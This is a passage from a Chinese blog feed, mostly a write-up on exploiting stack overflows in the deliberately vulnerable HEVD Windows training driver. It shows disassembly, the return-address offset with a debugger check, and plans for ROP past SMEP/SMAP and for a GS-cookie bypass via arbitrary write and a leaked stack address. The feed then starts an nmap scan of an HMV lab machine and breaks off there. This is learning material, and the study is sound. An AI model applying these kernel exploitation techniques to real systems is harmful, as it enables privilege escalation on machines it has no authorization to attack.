class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UserBuffer Size: 0x%zX\n&quot;</span>, Size);</span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] KernelBuffer: 0x%p\n&quot;</span>, KernelBuffer);</span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] KernelBuffer Size: 0x%zX\n&quot;</span>, <span class="number">0x800</span>ui64);</span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Triggering Buffer Overflow in Stack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memmove</span>(KernelBuffer, UserBuffer, Size);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p><strong>ProbeForRead</strong> 例程检查用户模式缓冲区是否实际驻留在地址空间的用户部分，并且是否正确对齐。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">ProbeForRead</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] <span class="type">const</span> <span class="keyword">volatile</span> VOID *Address,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] SIZE_T              Length,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] ULONG               Alignment</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>从汇编看，不存在cookie，并且存在exception信息</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">PAGE:<span class="number">00000001400866</span>AE                 call    memmove</span><br><span class="line">PAGE:<span class="number">00000001400866B</span>3                 jmp     <span class="type">short</span> loc_1400866D0</span><br><span class="line">PAGE:<span class="number">00000001400866B</span>3 ;   &#125; <span class="comment">// starts at 14008661E</span></span><br><span class="line">PAGE:<span class="number">00000001400866B</span>5 ; ---------------------------------------------------------------------------</span><br><span class="line">PAGE:<span class="number">00000001400866B</span>5</span><br><span class="line">PAGE:<span class="number">00000001400866B</span>5 $LN6_0:                                 ; DATA XREF: .rdata:<span class="number">000000014000269</span>C↑o</span><br><span class="line">PAGE:<span class="number">00000001400866B</span>5 ;   __except(<span class="number">1</span>) <span class="comment">// owned by 14008661E</span></span><br><span class="line">PAGE:<span class="number">00000001400866B</span>5                 mov     ebx, eax</span><br><span class="line">PAGE:<span class="number">00000001400866B</span>7                 mov     r9d, eax</span><br><span class="line">PAGE:<span class="number">00000001400866B</span>A                 lea     r8, aExceptionCode0 ; <span class="string">&quot;[-] Exception Code: 0x%X\n&quot;</span></span><br><span class="line">PAGE:<span class="number">00000001400866</span>C1                 mov     edx, <span class="number">3</span>          ; Level</span><br><span class="line">PAGE:<span class="number">00000001400866</span>C6                 lea     ecx, [Size+<span class="number">4</span>Ah] ; ComponentId</span><br><span class="line">PAGE:<span class="number">00000001400866</span>C9                 call    cs:__imp_DbgPrintEx</span><br><span class="line">PAGE:<span class="number">00000001400866</span>CF                 nop</span><br><span class="line">PAGE:<span class="number">00000001400866</span>D0</span><br><span class="line">PAGE:<span class="number">00000001400866</span>D0 loc_1400866D0:                          ; CODE XREF: TriggerBufferOverflowStack+CF↑j</span><br><span class="line">PAGE:<span class="number">00000001400866</span>D0                 mov     eax, ebx</span><br><span class="line">PAGE:<span class="number">00000001400866</span>D2                 lea     r11, [rsp+<span class="number">838</span>h+var_18]</span><br><span class="line">PAGE:<span class="number">00000001400866</span>DA                 mov     rbx, [r11+<span class="number">20</span>h]</span><br><span class="line">PAGE:<span class="number">00000001400866</span>DE                 mov     rsi, [r11+<span class="number">28</span>h]</span><br><span class="line">PAGE:<span class="number">00000001400866E2</span>                 mov     rdi, [r11+<span class="number">30</span>h]</span><br><span class="line">PAGE:<span class="number">00000001400866E6</span>                 mov     rsp, r11</span><br><span class="line">PAGE:<span class="number">00000001400866E9</span>                 pop     r15</span><br><span class="line">PAGE:<span class="number">00000001400866</span>EB                 pop     r14</span><br><span class="line">PAGE:<span class="number">00000001400866</span>ED                 pop     r12</span><br><span class="line">PAGE:<span class="number">00000001400866</span>EF                 retn</span><br><span class="line">PAGE:<span class="number">00000001400866</span>EF ; &#125; <span class="comment">// starts at 1400865E4</span></span><br></pre></td></tr></table></figure>


<p>首先，我们需要确定返回地址偏移，IDA标记了返回地址的地址</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-0000000000000818 KernelBuffer    <span class="built_in">dd</span> 512 dup(?)</span><br><span class="line">-0000000000000018 var_18          db ?</span><br><span class="line">-0000000000000017                 db ? ; undefined</span><br><span class="line">-0000000000000016                 db ? ; undefined</span><br><span class="line">-0000000000000015                 db ? ; undefined</span><br><span class="line">-0000000000000014                 db ? ; undefined</span><br><span class="line">-0000000000000013                 db ? ; undefined</span><br><span class="line">-0000000000000012                 db ? ; undefined</span><br><span class="line">-0000000000000011                 db ? ; undefined</span><br><span class="line">-0000000000000010                 db ? ; undefined</span><br><span class="line">-000000000000000F                 db ? ; undefined</span><br><span class="line">-000000000000000E                 db ? ; undefined</span><br><span class="line">-000000000000000D                 db ? ; undefined</span><br><span class="line">-000000000000000C                 db ? ; undefined</span><br><span class="line">-000000000000000B                 db ? ; undefined</span><br><span class="line">-000000000000000A                 db ? ; undefined</span><br><span class="line">-0000000000000009                 db ? ; undefined</span><br><span class="line">-0000000000000008                 db ? ; undefined</span><br><span class="line">-0000000000000007                 db ? ; undefined</span><br><span class="line">-0000000000000006                 db ? ; undefined</span><br><span class="line">-0000000000000005                 db ? ; undefined</span><br><span class="line">-0000000000000004                 db ? ; undefined</span><br><span class="line">-0000000000000003                 db ? ; undefined</span><br><span class="line">-0000000000000002                 db ? ; undefined</span><br><span class="line">-0000000000000001                 db ? ; undefined</span><br><span class="line">+0000000000000000  r              db 8 dup(?)</span><br></pre></td></tr></table></figure>

<p>调试一下，确实如此</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">RtlFillMemory</span>(lpBuffer, <span class="number">0x1000</span>, <span class="number">0x43</span>);</span><br><span class="line">PDWORD64 rop = (PDWORD64)((PCHAR)lpBuffer + <span class="number">0x818</span>);</span><br><span class="line">*rop = <span class="number">0xdeadbeef</span>;</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>: kd&gt; r rsp</span><br><span class="line">rsp=fffff3082725a708</span><br><span class="line"><span class="number">4</span>: kd&gt; t</span><br><span class="line"><span class="number">00000000</span>`deadbeef ??              ???</span><br></pre></td></tr></table></figure>

<p>因此</p>
<ul>
<li>ROP关闭SMEP&#x2F;SMAP</li>
<li>跳转到用户态进行执行shellcode</li>
</ul>
<h2 id="With-GS"><a href="#With-GS" class="headerlink" title="With GS"></a>With GS</h2><p>code如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x222007</span>:</span><br><span class="line"><span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS ******\n&quot;</span>);</span><br><span class="line">FakeObjectNonPagedPoolNxIoctlHandler = <span class="built_in">BufferOverflowStackGSIoctlHandler</span>(Irp, CurrentStackLocation);</span><br><span class="line">v7 = <span class="string">&quot;****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS ******\n&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> LABEL_64;</span><br></pre></td></tr></table></figure>

<p>不同点</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">TriggerBufferOverflowStackGS</span><span class="params">(<span class="type">void</span> *UserBuffer, <span class="type">size_t</span> Size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int8 KernelBuffer[<span class="number">512</span>]; <span class="comment">// [rsp+20h] [rbp-238h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(KernelBuffer, <span class="number">0</span>, <span class="built_in">sizeof</span>(KernelBuffer));</span><br><span class="line">  <span class="built_in">ProbeForRead</span>(UserBuffer, <span class="number">0x200</span>ui64, <span class="number">1u</span>);</span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UserBuffer: 0x%p\n&quot;</span>, UserBuffer);</span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UserBuffer Size: 0x%zX\n&quot;</span>, Size);</span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] KernelBuffer: 0x%p\n&quot;</span>, KernelBuffer);</span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] KernelBuffer Size: 0x%zX\n&quot;</span>, <span class="number">0x200</span>ui64);</span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Triggering Buffer Overflow in Stack (GS)\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memmove</span>(KernelBuffer, UserBuffer, Size);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看汇编可以看出来存在cookie的比较</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">PAGE:<span class="number">00000001400867E4</span>                 call    memmove</span><br><span class="line">PAGE:<span class="number">00000001400867E9</span>                 jmp     <span class="type">short</span> loc_140086806</span><br><span class="line">PAGE:<span class="number">00000001400867E9</span> ;   &#125; <span class="comment">// starts at 140086754</span></span><br><span class="line">PAGE:<span class="number">00000001400867</span>EB ; ---------------------------------------------------------------------------</span><br><span class="line">PAGE:<span class="number">00000001400867</span>EB</span><br><span class="line">PAGE:<span class="number">00000001400867</span>EB $LN6_1:                                 ; DATA XREF: .rdata:<span class="number">00000001400026</span>D0↑o</span><br><span class="line">PAGE:<span class="number">00000001400867</span>EB ;   __except(<span class="number">1</span>) <span class="comment">// owned by 140086754</span></span><br><span class="line">PAGE:<span class="number">00000001400867</span>EB                 mov     ebx, eax</span><br><span class="line">PAGE:<span class="number">00000001400867</span>ED                 mov     r9d, eax</span><br><span class="line">PAGE:<span class="number">00000001400867F</span>0                 lea     r8, aExceptionCode0 ; <span class="string">&quot;[-] Exception Code: 0x%X\n&quot;</span></span><br><span class="line">PAGE:<span class="number">00000001400867F</span>7                 mov     edx, <span class="number">3</span>          ; Level</span><br><span class="line">PAGE:<span class="number">00000001400867F</span>C                 lea     ecx, [Size+<span class="number">4</span>Ah] ; ComponentId</span><br><span class="line">PAGE:<span class="number">00000001400867F</span>F                 call    cs:__imp_DbgPrintEx</span><br><span class="line">PAGE:<span class="number">0000000140086805</span>                 nop</span><br><span class="line">PAGE:<span class="number">0000000140086806</span></span><br><span class="line">PAGE:<span class="number">0000000140086806</span> loc_140086806:                          ; CODE XREF: TriggerBufferOverflowStackGS+D9↑j</span><br><span class="line">PAGE:<span class="number">0000000140086806</span>                 mov     eax, ebx</span><br><span class="line">PAGE:<span class="number">0000000140086808</span>                 mov     UserBuffer, [rsp+<span class="number">258</span>h+var_38]</span><br><span class="line">PAGE:<span class="number">0000000140086810</span>                 <span class="keyword">xor</span>     UserBuffer, rsp ; StackCookie</span><br><span class="line">PAGE:<span class="number">0000000140086813</span>                 call    __security_check_cookie</span><br><span class="line">PAGE:<span class="number">0000000140086818</span>                 mov     rbx, [rsp+<span class="number">258</span>h+arg_10]</span><br><span class="line">PAGE:<span class="number">0000000140086820</span>                 add     rsp, <span class="number">230</span>h</span><br><span class="line">PAGE:<span class="number">0000000140086827</span>                 pop     r15</span><br><span class="line">PAGE:<span class="number">0000000140086829</span>                 pop     r14</span><br><span class="line">PAGE:<span class="number">000000014008682B</span>                 pop     r12</span><br><span class="line">PAGE:<span class="number">000000014008682</span>D                 pop     rdi</span><br><span class="line">PAGE:<span class="number">000000014008682</span>E                 pop     rsi</span><br><span class="line">PAGE:<span class="number">000000014008682F</span>                 retn</span><br></pre></td></tr></table></figure>

<p>GS: Cookie 用于在使用 <a href="https://learn.microsoft.com/zh-cn/cpp/build/reference/gs-buffer-security-check?view=msvc-170">&#x2F;GS（缓冲区安全检查）</a>编译的代码中和使用异常处理的代码中提供缓冲区溢出保护。 进入受到溢出保护的函数时，Cookie 被置于堆栈之上；退出时，会将堆栈上的值与全局 Cookie 进行比较。 它们之间存在任何差异则表示已经发生缓冲区溢出，并导致该程序的立即终止。</p>
<p>这个var_38就是cookie的值，最后进行一个比较</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">-0000000000000238</span> KernelBuffer    db <span class="number">512</span> <span class="built_in">dup</span>(?)</span><br><span class="line"><span class="number">-0000000000000038</span> var_38          dq ?</span><br><span class="line"><span class="number">-0000000000000030</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000002F</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000002</span>E                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000002</span>D                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000002</span>C                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000002B</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000002</span>A                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000029</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000028</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000027</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000026</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000025</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000024</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000023</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000022</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000021</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000020</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000001F</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000001</span>E                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000001</span>D                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000001</span>C                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000001B</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000001</span>A                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000019</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000018</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000017</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000016</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000015</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000014</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000013</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000012</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000011</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000010</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000000F</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000000</span>E                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000000</span>D                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000000</span>C                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000000B</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000000</span>A                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000009</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000008</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000007</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000006</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000005</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000004</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000003</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000002</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000001</span>                 db ? ; undefined</span><br><span class="line">+<span class="number">0000000000000000</span>  r              db <span class="number">8</span> <span class="built_in">dup</span>(?)</span><br></pre></td></tr></table></figure>

<p>其初始化过程</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">PAGE:<span class="number">0000000140086724</span>                 mov     rax, cs:__security_cookie</span><br><span class="line">PAGE:<span class="number">000000014008672B</span>                 <span class="keyword">xor</span>     rax, rsp</span><br><span class="line">PAGE:<span class="number">000000014008672</span>E                 mov     [rsp+<span class="number">258</span>h+var_38], rax</span><br></pre></td></tr></table></figure>

<p>绕过cookie的思路：</p>
<ul>
<li>在x86下可以通过修改 SEH 中的 exception handler 地址并触发异常来控制程序的执行流程。但是这个方法在这里并不可行，因为环境是 64 位系统，而只有 32 位系统的 SEH 信息保存在栈中，64 位系统的 SEH 不在栈上<a href="https://sup817ch.github.io/2020/09/04/Windows-x64-SEH%E7%AC%94%E8%AE%B0/">(1)</a>。因此无法使用 SEH 进行漏洞利用。</li>
<li>修改 .data 和 栈上存储的 cookie 值。要做到这点，需要找到一个任意写漏洞，而 HEVD 显然是有这个漏洞的，就在 <code>TriggerArbitraryWrite</code> 函数中。除此之外，此次漏洞函数中还额外对 security_cookie 进行了一次栈顶的异或操作，因此还要获取栈顶的数值</li>
<li>覆盖虚函数指针 条件：函数参数中有对象或结构体的指针；参数是放在栈上的。由于测试环境是 64 位系统，参数保存在寄存器中，因此不考虑。</li>
<li>读取 cookie 数值并计算出 xored security_cookie 数值 需要一个任意读漏洞读取 cookie 的数值，以及想办法获取计算 xored security_cookie 时 RSP 寄存器的数值。</li>
</ul>
<p>如何获取rsp的值？</p>
<p>首先利用 <code>NtQuerySystemInformation</code> 函数获取当前进程的 <code>PSYSTEM_EXTENDED_PROCESS_INFORMATION</code> 信息，该信息中包含了进程中每个线程的 StackBase 和 StackLimit 信息，StackBase 表示栈的起始地址，StackLimit 表示栈范围内可分配的最小地址，由于栈空间是向下分配的，因此 StackBase 的数值大于 StackLimit 的数值。</p>
<p>what to where: 其实是任意地址读写。</p>
<ul>
<li>where内核地址，what写数据 &#x3D;&gt; 任意写</li>
<li>where是用户buffer，what是内核地址 &#x3D;&gt; 任意读</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x22200B</span>:</span><br><span class="line">	<span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;****** HEVD_IOCTL_ARBITRARY_WRITE ******\n&quot;</span>);</span><br><span class="line">	FakeObjectNonPagedPoolNxIoctlHandler = <span class="built_in">ArbitraryWriteIoctlHandler</span>(Irp, CurrentStackLocation);</span><br><span class="line">	v7 = <span class="string">&quot;****** HEVD_IOCTL_ARBITRARY_WRITE ******\n&quot;</span>;</span><br><span class="line">	<span class="keyword">goto</span> LABEL_64;</span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">TriggerArbitraryWrite</span><span class="params">(_WRITE_WHAT_WHERE *UserWriteWhatWhere)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 *What; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 *Where; <span class="comment">// rdi</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">ProbeForRead</span>(UserWriteWhatWhere, <span class="number">0x10</span>ui64, <span class="number">1u</span>);</span><br><span class="line">  What = UserWriteWhatWhere-&gt;What;</span><br><span class="line">  Where = UserWriteWhatWhere-&gt;Where;</span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UserWriteWhatWhere: 0x%p\n&quot;</span>, UserWriteWhatWhere);</span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] WRITE_WHAT_WHERE Size: 0x%zX\n&quot;</span>, <span class="number">0x10</span>ui64);</span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UserWriteWhatWhere-&gt;What: 0x%p\n&quot;</span>, What);</span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UserWriteWhatWhere-&gt;Where: 0x%p\n&quot;</span>, Where);</span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Triggering Arbitrary Write\n&quot;</span>);</span><br><span class="line">  *Where = *What;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用NtQuerySystemInformation(ZwQuerySystemInformation)获得内核信息</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__kernel_entry NTSTATUS <span class="title">NtQuerySystemInformation</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            SYSTEM_INFORMATION_CLASS SystemInformationClass,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, out]       PVOID                    SystemInformation,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            ULONG                    SystemInformationLength,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional] PULONG                   ReturnLength</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p><code>SYSTEM_INFORMATION_CLASS</code>是一个枚举类型，<a href="https://blog.csdn.net/weixin_42270114/article/details/125803630">文章</a>存在这个结构体，我们关心如下的一个就行</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> <span class="title class_">_SYSTEM_INFORMATION_CLASS</span> &#123;</span><br><span class="line">	SystemExtendedProcessInformation = <span class="number">0x39</span></span><br><span class="line">&#125; SYSTEM_INFORMATION_CLASS;</span><br></pre></td></tr></table></figure>

<p><code>SystemInformation</code> 是查询结果</p>
<p><code>SystemInformationLength</code>是SystemInformation缓冲区大小</p>
<p><code>ReturnLength</code>返回实际大小，如果大于<code>SystemInformationLength</code>函数调用会失败</p>
<p>相关利用：<a href="https://gist.github.com/TheWover/799822ce3d1239e0bd5764ac0b0adfda">List process information including process architecture and username</a></p>
<p>查询的结果是 <code>PSYSTEM_EXTENDED_PROCESS_INFORMATION</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_SYSTEM_EXTENDED_PROCESS_INFORMATION</span></span><br><span class="line">&#123;</span><br><span class="line">	ULONG NextEntryOffset;</span><br><span class="line">	ULONG NumberOfThreads;</span><br><span class="line">	LARGE_INTEGER SpareLi1;</span><br><span class="line">	LARGE_INTEGER SpareLi2;</span><br><span class="line">	LARGE_INTEGER SpareLi3;</span><br><span class="line">	LARGE_INTEGER CreateTime;</span><br><span class="line">	LARGE_INTEGER UserTime;</span><br><span class="line">	LARGE_INTEGER KernelTime;</span><br><span class="line">	UNICODE_STRING ImageName;</span><br><span class="line">	KPRIORITY BasePriority;</span><br><span class="line">	ULONG ProcessId;</span><br><span class="line">	ULONG InheritedFromUniqueProcessId;</span><br><span class="line">	ULONG HandleCount;</span><br><span class="line">	ULONG SessionId;</span><br><span class="line">	PVOID PageDirectoryBase;</span><br><span class="line">	VM_COUNTERS VirtualMemoryCounters;</span><br><span class="line">	SIZE_T PrivatePageCount;</span><br><span class="line">	IO_COUNTERS IoCounters;</span><br><span class="line">	SYSTEM_EXTENDED_THREAD_INFORMATION Threads[<span class="number">1</span>];</span><br><span class="line">&#125; SYSTEM_EXTENDED_PROCESS_INFORMATION, * PSYSTEM_EXTENDED_PROCESS_INFORMATION;</span><br></pre></td></tr></table></figure>

<p>其中存在一个NumberOfThread的变量，我们可以遍历<code>SYSTEM_EXTENDED_THREAD_INFORMATION Threads[1];</code>来获得StackBase和StackLimit</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_SYSTEM_EXTENDED_THREAD_INFORMATION</span></span><br><span class="line">&#123;</span><br><span class="line">    SYSTEM_THREAD_INFORMATION ThreadInfo;</span><br><span class="line">    PVOID StackBase;</span><br><span class="line">    PVOID StackLimit;</span><br><span class="line">    PVOID Win32StartAddress;</span><br><span class="line">    PVOID TebBase; <span class="comment">// since VISTA</span></span><br><span class="line">    ULONG_PTR Reserved2;</span><br><span class="line">    ULONG_PTR Reserved3;</span><br><span class="line">    ULONG_PTR Reserved4;</span><br><span class="line">&#125; SYSTEM_EXTENDED_THREAD_INFORMATION, * PSYSTEM_EXTENDED_THREAD_INFORMATION;</span><br></pre></td></tr></table></figure>

<p>securityCookie在模块中的位置：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">.data:<span class="number">0000000140003010</span> ; <span class="type">uintptr_t</span> _security_cookie</span><br><span class="line">.data:<span class="number">0000000140003010</span> __security_cookie dq <span class="number">2B</span>992DDFA232h </span><br></pre></td></tr></table></figure>

<p>参考文章指出，每次触发驱动的 handler 函数时，一定会调用 <code>nt!NtDeviceIoControlFile</code> 函数，并且返回地址在 <code>nt!NtDeviceIoControlFile+0x56</code>。</p>
<p>TriggerStackOverflow与获得栈的基址偏移是否相同？多跑几次</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">Python&gt;<span class="number">0xfffff88b1fdbf000</span><span class="number">-0xfffff88b1fdc44b0</span></span><br><span class="line"><span class="number">-0x54b0</span></span><br><span class="line"></span><br><span class="line">Python&gt;<span class="number">0xfffff88b1dc8d000</span><span class="number">-0xfffff88b1dc924b0</span></span><br><span class="line"><span class="number">-0x54b0</span></span><br></pre></td></tr></table></figure>

<p>看起来是一样的，因此我们直接获得rsp地址</p>
<p>memmove时寄存器的值</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">RAX: <span class="number">0000000000000000</span>   RBX: <span class="number">0000000000000000</span>   RCX: FFFFEC8EDD1724D0   </span><br><span class="line">RDX: <span class="number">00000250870E0000</span>   RSI: <span class="number">0000000000000008</span>   RDI: <span class="number">00000250870E0000</span>   </span><br><span class="line">RIP: FFFFF801211467E4   RSP: FFFFEC8EDD1724B0   RBP: FFFFAC01F21BCE50   </span><br><span class="line">R8:  <span class="number">0000000000000008</span>   R9:  <span class="number">000000000000004</span>D   R10: <span class="number">0000000000000000</span>   </span><br><span class="line">R11: FFFFEC8EDD1724A8   R12: <span class="number">0000000000000200</span>   R13: FFFFAC01F2AC9E10   </span><br><span class="line">R14: <span class="number">000000000000004</span>D   R15: <span class="number">0000000000000003</span> </span><br></pre></td></tr></table></figure>

<p>如果直接写入，栈溢出触发Exception，直接崩溃</p>
<ul>
<li>缓冲区太大了（0x1000）后来把缓冲区该小一点(0x270)，发现是可以</li>
</ul>
<p>看了几篇文章，使用了修改页表的方式 bypass SMEP，有时间学习一下</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://github.com/vportal/HEVD">HEVD exploits for Windows 10</a></li>
<li><a href="https://kristal-g.github.io/2021/02/07/HEVD_StackOverflowGS_Windows_10_RS5_x64.html">HEVD Exploit - Stack OverflowGS on Windows 10</a></li>
<li>[HEVD exploit 系列] StackOverflowGS](<a href="https://www.zoemurmure.top/posts/hevd_stackoberflowgs/">https://www.zoemurmure.top/posts/hevd_stackoberflowgs/</a>)</li>
<li><a href="https://mp.weixin.qq.com/s/DuPFEdcRsFWU1VApOp5W0g">Windows x64 分页机制</a></li>
</ul>
]]></content>
      <categories>
        <category>HEVD</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-Zeug</title>
    <url>/2024/02/22/HMV-Zeug/</url>
    <content><![CDATA[<blockquote>
<p>打个靶机</p>
</blockquote>
<span id="more"></span>

<h2 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo nmap -p- --min-rate=10000 &lt;IP&gt;</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.124.6</span><br><span class="line">Host is up (0.0012s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">21/tcp   open  ftp</span><br><span class="line">5000/tcp open  upnp</span><br><span class="line">MAC Address: 08:00:27:8D:5E:6D (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Nmap done at Thu Feb 22 10:23:52 2024 -- 1 IP address (1 host up) scanned in 66.37 seconds</span></span><br><span class="line"></span><br><span class="line">$ <span class="variable">$sudo</span> nmap -p21,5000 -sCV &lt;IP&gt;</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">21/tcp   open  ftp     